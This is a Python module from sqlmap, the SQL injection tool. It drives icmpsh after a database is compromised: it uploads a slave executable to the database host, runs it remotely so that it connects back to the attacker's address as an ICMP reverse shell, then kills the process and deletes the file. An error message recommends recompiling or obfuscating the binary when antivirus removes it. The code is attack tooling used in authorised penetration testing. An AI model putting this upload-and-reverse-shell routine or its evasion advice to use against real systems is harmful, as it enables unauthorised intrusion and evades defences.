#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re
import socket
import time

from extra.icmpsh.icmpsh_m import main as icmpshmaster
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import SqlmapDataException

class ICMPsh(object):
    """
    This class defines methods to call icmpsh for plugins.
    """

    def _initVars(self):
        self.lhostStr = None
        self.rhostStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP() or conf.hostname
        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))

    def _selectRhost(self):
        address = None
        message = "what is the back-end DBMS address? "

        if self.remoteIP:
            message += "[Enter for '%s' (detected)] " % self.remoteIP

        while not address:
            address = readInput(message, default=self.remoteIP)

            if conf.batch and not address:
                raise SqlmapDataException("remote host address is missing")

        return address

    def _selectLhost(self):
        address = None
        message = "what is the local address? "

        if self.localIP:
            message += "[Enter for '%s' (detected)] " % self.localIP

        valid = None
        while not valid:
            valid = True
            address = readInput(message, default=self.localIP or "")

            try:
                socket.inet_aton(address)
            except socket.error:
                valid = False
            finally:
                valid = valid and re.search(r"\d+\.\d+\.\d+\.\d+", address) is not None

            if conf.batch and not address:
                raise SqlmapDataException("local host address is missing")
            elif address and not valid:
                warnMsg = "invalid local host address"
                logger.warning(warnMsg)

        return address

    def _prepareIngredients(self, encode=True):
        self.localIP = getattr(self, "localIP", None)
        self.remoteIP = getattr(self, "remoteIP", None)
        self.lhostStr = ICMPsh._selectLhost(self)
        self.rhostStr = ICMPsh._selectRhost(self)

    def _runIcmpshMaster(self):
        infoMsg = "running icmpsh master locally"
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def _runIcmpshSlaveRemote(self):
        infoMsg = "running icmpsh slave remotely"
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        ICMPsh._initVars(self)
        self._randStr = randomStr(lowercase=True)
        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr

        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))

        logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)

        if web:
            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
        else:
            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)

        if written is not True:
            errMsg = "there has been a problem uploading icmpsh, it "
            errMsg += "looks like the binary file has not been written "
            errMsg += "on the database underlying file system or an AV has "
            errMsg += "flagged it as malicious and removed it. In such a case "
            errMsg += "it is recommended to recompile icmpsh with slight "
            errMsg += "modification to the source code or pack it with an "
            errMsg += "obfuscator software"
            logger.error(errMsg)

            return False
        else:
            logger.info("icmpsh successfully uploaded")
            return True

    def icmpPwn(self):
        ICMPsh._prepareIngredients(self)
        self._runIcmpshSlaveRemote()
        self._runIcmpshMaster()

        debugMsg = "icmpsh master exited"
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self._icmpslaveRemote)
